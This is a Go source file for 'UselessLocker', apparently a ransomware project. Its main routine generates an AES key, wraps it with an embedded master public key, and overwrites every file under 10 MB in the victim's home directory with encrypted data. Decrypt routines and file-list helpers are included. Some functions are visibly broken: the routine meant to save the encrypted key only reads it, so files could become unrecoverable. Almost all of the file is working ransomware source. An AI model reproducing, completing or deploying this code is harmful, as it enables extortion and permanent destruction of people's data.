// Package useless contains all the nessessary code for useless locker.
package useless

import (
	"bytes"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"

	//"github.com/TheCreeper/UselessLocker/useless/config"
	"github.com/TheCreeper/UselessLocker/useless/crypto"
	"github.com/TheCreeper/UselessLocker/useless/store"
)

func Start() (err error) {
	// Get some information about the user the executable is running under
	user, err := user.Current()
	if err != nil {
		return
	}

	// Extract all the files in the store to the specified temp directory
	s, err := store.Open()
	if err != nil {
		return
	}

	// Copy some files in the store to memory
	pubBytes, err := s.Load("master.pem")
	if err != nil {
		return
	}

	// Generate a key to use for this session
	key, err := crypto.GenerateKey(crypto.AES128)
	if err != nil {
		return
	}

	// Encrypt the generated aes key using the public key of the master and write it out to
	// the filesystem as soon as possible. We dont want to encrypt files and lose the key.
	ekey, err := crypto.EncryptKey(pubBytes, key)
	if err != nil {
		return
	}

	// Write out the encrypted key to the users home directory
	if err = WriteEncKeyFile(user.HomeDir, ekey); err != nil {
		return
	}

	// Start encrypting all files in the users home directory.
	if err = EncryptFiles(user.HomeDir, key); err != nil {
		return
	}
	return
}

// EncryptFiles will attempt to encrypt (using the provided key) all files in a users home
// directory that fit a specific criteria.
func EncryptFiles(dirname string, key []byte) (err error) {
	// Get a list of files in the users home directory that are less than 10MB
	files, err := GetFileList(dirname, 10485760)
	if err != nil {
		return
	}

	// Write out the file list to a file in the users home directory.
	if err = WriteFileList(dirname, files); err != nil {
		return
	}

	// Start encrypting each file in the list
	for _, file := range files {
		if err = EncryptFile(file, key); err != nil {
			return
		}
	}
	return
}

// EncryptFile will attempt to copy the contents of the specified file into memory and then encrypt
// it using the provided key. The orginal file contents is over written with the encrypted bytes
// in memory.
func EncryptFile(filename string, key []byte) (err error) {
	b, err := ioutil.ReadFile(filename)
	if err != nil {
		return
	}

	ciphertext, err := crypto.EncryptBytes(key, b)
	if err != nil {
		return
	}

	err = ioutil.WriteFile(filename, ciphertext, 0644)
	if err != nil {
		return
	}
	return
}

// DecryptFiles will read the list of encrypted files and attempt to decrypt each one using the
// provided key.
func DecryptFiles(dirname string, key []byte) (err error) {
	files, err := ReadFileList(dirname)
	if err != nil {
		return
	}
	for _, file := range files {
		// Check if file still exists otherwise skip it.
		if _, err := os.Stat(file); os.IsNotExist(err) {
			continue
		}

		if err = DecryptFile(file, key); err != nil {
			return
		}
	}
	return
}

// DecryptFile will attempt to copy the contents of the specified file into memory and then decrypt
// it using the provided key. The orginal file contents is over written with the decrypted bytes
// in memory.
func DecryptFile(filename string, key []byte) (err error) {
	// Copy file contents into memory before decrypting and overwriting it.
	ciphertext, err := ioutil.ReadFile(filename)
	if err != nil {
		return
	}

	// Decrypt file contents using the provided key.
	b, err := crypto.DecryptBytes(key, ciphertext)
	if err != nil {
		return
	}

	// Copy the decrypted file contents from memory to disk. Overwrite the file
	// contents.
	err = ioutil.WriteFile(filename, b, 0644)
	if err != nil {
		return
	}
	return
}

// GetFileList compiles a list of files that are less than or equal to the specified file size.
// The file list is returned as a string slice with full location path.
func GetFileList(dirname string, size int64) (files []string, err error) {
	list, err := ioutil.ReadDir(dirname)
	if err != nil {
		return
	}
	for _, file := range list {
		if file.IsDir() {
			fl, err := GetFileList(filepath.Join(dirname, file.Name()), size)
			if err != nil {
				return nil, err
			}
			files = append(files, fl...)
			continue
		}

		if file.Mode().IsRegular() &&
			(file.Mode().Perm() <= 0777) &&
			(file.Size() <= size) {
			files = append(files, filepath.Join(dirname, file.Name()))
		}
	}
	return
}

// WriteFileList writes a list of files to the specified directory.
func WriteFileList(dirname string, files []string) (err error) {
	// Add a newline character after every filepath
	var data []byte
	for _, v := range files {
		data = append(data, []byte(v)...)
		data = append(data, []byte(string('\n'))...)
	}

	err = ioutil.WriteFile(filepath.Join(dirname, "useless_file_list.txt"), data, 0644)
	if err != nil {
		return
	}
	return
}

// ReadFileList reads a list of files contained in a file within the users home directory.
func ReadFileList(dirname string) (files []string, err error) {
	b, err := ioutil.ReadFile(filepath.Join(dirname, "useless_file_list.txt"))
	if err != nil {
		return
	}

	buf := bytes.NewBuffer(b)
	for {
		line, err := buf.ReadString('\n')
		if err != nil {
			return nil, err
		}
		files = append(files, line)
	}
	return
}

// ReadKeyFile reads the keyfile located in the users home directory containing the unencrypted key
// used to decrypt/encrypt files.
func ReadKeyFile(dirname string) (key []byte, err error) {
	key, err = ioutil.ReadFile(filepath.Join(dirname, "useless_key.txt"))
	if err != nil {
		return
	}
	// Do some checks on the key here
	return
}

// ReadEncKeyFile reads the encrypted key (the key used to encrypt files) into memory. This key
// is assumed to have being encrypted using the public key of the master. The encrypted key is
// usually sent to the maser sevrer somehow however is written to the disk incase something goes
// wrong.
func ReadEncKeyFile(dirname string) (ekey []byte, err error) {
	ekey, err = ioutil.ReadFile(filepath.Join(dirname, "useless_encrypted_key.txt"))
	if err != nil {
		return
	}
	// Do some checks on the key here
	return
}

// WriteEncKeyFile writes the encrypted key to the disk. This key is assumed to have being encrypted
// using the public key of the master.
func WriteEncKeyFile(dirname string, ekey []byte) (err error) {
	ekey, err = ioutil.ReadFile(filepath.Join(dirname, "useless_encrypted_key.txt"))
	if err != nil {
		return
	}
	return
}
